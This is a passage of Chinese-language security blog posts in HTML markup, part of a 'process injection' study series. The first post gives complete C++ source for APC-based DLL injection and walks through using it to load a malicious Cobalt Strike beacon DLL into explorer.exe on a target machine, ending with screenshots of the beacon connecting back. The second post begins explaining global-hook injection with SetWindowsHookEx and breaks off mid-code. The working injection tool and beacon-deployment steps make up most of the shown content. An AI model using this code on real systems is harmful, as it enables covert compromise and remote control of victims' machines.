class="built_in">ShowError</span>(<span class="string">&quot;VirtualAllocEx - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把Dll的路径复制到内存中</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == ::<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, wzDllFullPath, (<span class="built_in">strlen</span>(wzDllFullPath) + <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(wzDllFullPath), <span class="literal">nullptr</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowError</span>(<span class="string">&quot;WriteProcessMemory - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得LoadLibraryA的地址</span></span><br><span class="line">PVOID loadLibraryAddress = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历线程, 插入APC</span></span><br><span class="line"><span class="keyword">float</span> fail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 打开线程</span></span><br><span class="line">HANDLE hThread = ::<span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 插入APC</span></span><br><span class="line"><span class="keyword">if</span> (!::<span class="built_in">QueueUserAPC</span>((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))</span><br><span class="line">&#123;</span><br><span class="line">fail++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭线程句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>WriteProcessMemory</code>把dll路径写入内存</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, wzDllFullPath, (<span class="built_in">strlen</span>(wzDllFullPath) + <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(wzDllFullPath), <span class="literal">nullptr</span>)</span><br></pre></td></tr></table></figure><p>获取<code>LoadLibraryA</code>的地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVOID loadLibraryAddress = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br></pre></td></tr></table></figure><p>便利线程并插入APC，这里定义一个fail并进行判断，如果<code>QueueUserAPC</code>返回的值为NULL则线程遍历失败，fail的值就+1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 打开线程</span></span><br><span class="line">        HANDLE hThread = ::<span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line">        <span class="keyword">if</span> (hThread)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 插入APC</span></span><br><span class="line">            <span class="keyword">if</span> (!::<span class="built_in">QueueUserAPC</span>((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))</span><br><span class="line">            &#123;</span><br><span class="line">                fail++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主函数，定义dll地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;加载要注入的dll的路径&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用<code>OpenProcess</code>打开句柄</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);</span><br></pre></td></tr></table></figure><p>调用前面写好的<code>APCInject</code>函数实现APC注入</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">APCInject</span>(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to inject DLL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>采用手动输入的方式，通过<code>cin &gt;&gt; ulProcessID</code>将接收到的参数赋给<code>ulProcessID</code></p><p><img src="https://s2.loli.net/2022/02/26/2rVUp9QJ7gaW8YS.png" alt="image-20220225230246364"></p><h2 id="利用此方法上线CS"><a href="#利用此方法上线CS" class="headerlink" title="利用此方法上线CS"></a>利用此方法上线CS</h2><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inject3.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowError</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pszText)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> szError[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">::<span class="built_in">wsprintf</span>(szError, <span class="string">&quot;%s Error[%d]\n&quot;</span>, pszText, ::<span class="built_in">GetLastError</span>());</span><br><span class="line">::<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szError, <span class="string">&quot;ERROR&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//列出指定进程的所有线程</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetProcessThreadList</span><span class="params">(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 申请空间</span></span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;</span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line"></span><br><span class="line">pThreadIdList = (LPDWORD)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(pThreadIdList, dwThreadIdListMaxCount * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line"></span><br><span class="line">THREADENTRY32 th32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拍摄快照</span></span><br><span class="line">hThreadSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, th32ProcessID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构的大小</span></span><br><span class="line">th32.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(THREADENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历所有THREADENTRY32结构, 按顺序填入数组</span></span><br><span class="line"></span><br><span class="line">BOOL bRet = <span class="built_in">Thread32First</span>(hThreadSnap, &amp;th32);</span><br><span class="line"><span class="keyword">while</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (th32.th32OwnerProcessID == th32ProcessID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line">bRet = <span class="built_in">Thread32Next</span>(hThreadSnap, &amp;th32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*pThreadIdListLength = dwThreadIdListLength;</span><br><span class="line">*ppThreadIdList = pThreadIdList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">APCInject</span><span class="params">(HANDLE hProcess, CHAR* wzDllFullPath, LPDWORD pThreadIdList, DWORD dwThreadIdListLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 申请内存</span></span><br><span class="line"></span><br><span class="line">PVOID lpAddr = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T page_size = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">lpAddr = ::<span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">nullptr</span>, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lpAddr == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowError</span>(<span class="string">&quot;VirtualAllocEx - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 把Dll的路径复制到内存中</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == ::<span class="built_in">WriteProcessMemory</span>(hProcess, lpAddr, wzDllFullPath, (<span class="built_in">strlen</span>(wzDllFullPath) + <span class="number">1</span>) * <span class="built_in"><span class="keyword">sizeof</span></span>(wzDllFullPath), <span class="literal">nullptr</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ShowError</span>(<span class="string">&quot;WriteProcessMemory - Error\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, lpAddr, page_size, MEM_DECOMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得LoadLibraryA的地址</span></span><br><span class="line">PVOID loadLibraryAddress = ::<span class="built_in">GetProcAddress</span>(::<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历线程, 插入APC</span></span><br><span class="line"><span class="keyword">float</span> fail = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 打开线程</span></span><br><span class="line">HANDLE hThread = ::<span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 插入APC</span></span><br><span class="line"><span class="keyword">if</span> (!::<span class="built_in">QueueUserAPC</span>((PAPCFUNC)loadLibraryAddress, hThread, (ULONG_PTR)lpAddr))</span><br><span class="line">&#123;</span><br><span class="line">fail++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭线程句柄</span></span><br><span class="line">::<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Thread: %d\n&quot;</span>, dwThreadIdListLength);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Total Failed: %d\n&quot;</span>, (<span class="keyword">int</span>)fail);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)fail == <span class="number">0</span> || dwThreadIdListLength / fail &gt; <span class="number">0.5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Success to Inject APC\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Inject may be failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ULONG32 ulProcessID = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Input the Process ID:&quot;</span>);</span><br><span class="line">cin &gt;&gt; ulProcessID;</span><br><span class="line">CHAR wzDllFullPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WIN64</span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;加载要注入的dll的路径&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// _WIN64</span></span></span><br><span class="line"><span class="built_in">strcpy_s</span>(wzDllFullPath, <span class="string">&quot;加载要注入的dll的路径&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">GetProcessThreadList</span>(ulProcessID, &amp;pThreadIdList, &amp;dwThreadIdListLength))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Can not list the threads\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打开句柄</span></span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, ulProcessID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open Process\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注入</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">APCInject</span>(hProcess, wzDllFullPath, pThreadIdList, dwThreadIdListLength))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to inject DLL\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p>首先CS建立监听，生成一个恶意dll文件</p><p><img src="https://s2.loli.net/2022/02/25/V38oCg7a4bTDSdZ.png" alt="image-20220225230935262"></p><p>在目标机上运行编译好的exe文件，并输入要注入进程的PID,这里我使用explorer.exe测试</p><p><img src="https://s2.loli.net/2022/02/26/9QXrkBTn2bNRtqG.png" alt="image-20220226000549338"></p><p>编译，输入PID</p><p><img src="https://s2.loli.net/2022/02/26/4QrSXHW796IGtp1.png" alt="image-20220226000500412"></p><p>查看CS，已经成功上线，且进程也加载了beacon.dll.</p><p><img src="https://s2.loli.net/2022/02/26/eBzMxnlh9ygjoHk.png" alt="image-20220226000724483"></p><p><img src="https://s2.loli.net/2022/02/26/yXBqc3RZa1Sjp7f.png" alt="image-20220226000738251"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>进程注入系列二之全局钩子注入</title>
      <link href="/post/c7fe651a.html"/>
      <url>/post/c7fe651a.html</url>
      
        <content type="html"><![CDATA[<h2 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h2><p>Windows中大部分的应用程序都是基于消息机制的，它们都有一个消息过程函数比如<code>SetWindowsHookEx</code>函数</p><p>，根据不同的消息完成不同的功能。</p><p>消息钩子是windows提供的一种消息过滤和预处理机制，可以用来截获和监视系统中的消息。</p><p>按照钩子作用范围不同，又可以分为局部钩子和全局钩子。局部钩子是针对某个线程的，而全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。</p><h2 id="核心函数介绍"><a href="#核心函数介绍" class="headerlink" title="核心函数介绍"></a>核心函数介绍</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookExW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HOOKPROC lpfn,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ HINSTANCE hmod,</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD dwThreadId)</span></span>;</span><br></pre></td></tr></table></figure><p>1.<code>idHook</code> 要安装的钩子(HOOK)的类型，它决定了<code>HOOKPROC</code>被调用的时机，可选参数如下。</p><table><thead><tr><th><code>WH_MSGFILTER</code> = -1</th><th>线程级，截获用户与控件交互的消息</th></tr></thead><tbody><tr><td><code>WH_JOURNALRECORD</code> = 0</td><td>系统级，记录所有消息队列送出的输入消息</td></tr><tr><td><code>WH_JOURNALPLAYBACK</code> = 1</td><td>系统级，回放由WH_JOURNALRECORD记录的消息</td></tr><tr><td><code>WH_KEYBOARD</code> = 2</td><td>系统级或线程级，截获键盘消息</td></tr><tr><td><code>WH_GETMESSAGE</code> = 3</td><td>系统级或线程级，截获从消息队列送出的消息</td></tr><tr><td><code>WH_CALLWNDPROC</code> = 4</td><td>系统级或线程级，截获发送到目标窗口的消息</td></tr><tr><td><code>WH_CBT</code> = 5</td><td>系统级或线程级，截获系统基本消息 例如：窗口的创建，激活，关闭，最大/最小化，移动等</td></tr><tr><td><code>WH_SYSMSGFILTER</code> = 6</td><td>系统级，截获系统范围内用户与控件交互的消息</td></tr><tr><td><code>WH_MOUSE</code> = 7</td><td>系统级或线程级，截获鼠标消息</td></tr><tr><td><code>WH_HARDWARE</code> = 8</td><td>系统级或线程级，截获非标准硬件(非鼠标，键盘)的消息</td></tr><tr><td><code>WH_DEBUG</code> = 9</td><td>系统级或线程级，在其它钩子调用前调用，用于调试钩子</td></tr><tr><td><code>WH_SHELL</code> = 10</td><td>系统级或线程级，截获发给外壳应用程序的消息</td></tr><tr><td><code>WH_FOREGROUNDIDLE</code> = 11</td><td>系统级或线程级，在程序前台线程空闲时调用</td></tr><tr><td><code>WH_CALLWNDPROCRET</code> = 12</td><td>系统级或线程级，截获目标窗口处理完的消息 在SendMessage被调用后发生</td></tr><tr><td><code>WH_KEYBOARD_LL</code> = 13</td><td>系统级，截获全局键盘消息</td></tr><tr><td><code>WH_MOUSE_LL</code> = 14</td><td>系统级，截获全局鼠标消息</td></tr></tbody></table><p>2.<code>lpfn</code>指向钩子回调函数的指针。如果最后一个参数<code>dwThreadId</code>为0或者是其它进程创建的线程标识符，则<code>lpfn</code>参数必须指向DLL中的钩子回调函数，即<code>HOOKPROC</code>函数必须在DLL中实现。否则，<code>lpfn</code> 可以指向与当前进程相关联的代码中的钩子过程。</p><p>3.<code>hmod</code>包含由<code>lpfn</code>参数指向的钩子回调函数的<code>DLL</code>句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子回调函数位于当前进程关联的代码中，则<code>hmod</code>参数必须设置为<code>NULL</code>。</p><p>4.<code>dwThreadId</code>与钩子程序关联的线程标识符(指定要<code>HOOK</code>的线程 ID)。如果此参数为0，则钩子过程与系统中所有线程相关联，即全局消息钩子</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>通过<code>SetWindowsHookExW</code>函数安装一个用于过滤特定类型消息的钩子函数(钩子<code>WH_GETMESSAGE</code>可以立即被触发，而某些类型的钩子需要在处理指定类型的消息时才能被触发)，当其它进程中产生了我们过滤的消息，就会调用<code>HOOKPROC</code>，如果发现目标<code>DLL</code>(<code>HOOKPROC</code>实现的<code>DLL</code>)尚未加载,就会使用<code>KeUserModeCallback</code>函数回调<code>User32.dll</code>的<code>__ClientLoadLibrary()</code> 函数，由<code>User32.dll</code>把这个<code>DLL</code>加载到目标进程中(低级键盘和鼠标钩子的加载有所不同)，从而实现<code>DLL</code>注入其它进程的目的。</p><h2 id="代码及其实现过程"><a href="#代码及其实现过程" class="headerlink" title="代码及其实现过程"></a>代码及其实现过程</h2><p>首先新建一个dll项目</p><p><img src="https://s2.loli.net/2022/02/24/BTnVzaPN6KlQWsS.png" alt="image-20220224221831169"></p><p>在<code>pch.h</code>中声明这几个我们定义的函数都是裸函数，由我们自己平衡堆栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">SetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/02/24/cuLbPIKrqsvfHW5.png" alt="image-20220224222046446"></p><p>在<code>pch.cpp</code>里面写入三个函数并创建共享内存（进程通信的方法有很多，比如自定义消息、管道、dll共享节、共享内存等等，这里就用共享内存来实现进程通信）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 